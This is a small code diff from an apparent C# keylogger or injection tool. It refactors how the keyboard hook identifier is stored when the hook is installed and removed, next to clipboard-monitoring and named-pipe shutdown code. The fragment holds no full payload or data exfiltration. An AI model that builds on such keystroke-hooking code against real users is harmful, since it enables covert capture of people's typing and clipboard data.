@@ -85,13 +85,13 @@ namespace KeylogInject
             Thread t = new Thread(() => Application.Run(new ClipboardNotification()));
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
-            _hookIdentifier = SetHook(Keylogger.HookCallback);
+            Keylogger.HookIdentifier = SetHook(Keylogger.HookCallback);
             Application.Run();
         }
 
         private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
         {
-            UnhookWindowsHookEx(_hookIdentifier);
+            UnhookWindowsHookEx(Keylogger.HookIdentifier);
             _completed = true;
             _cts.Cancel();
             Application.Exit();
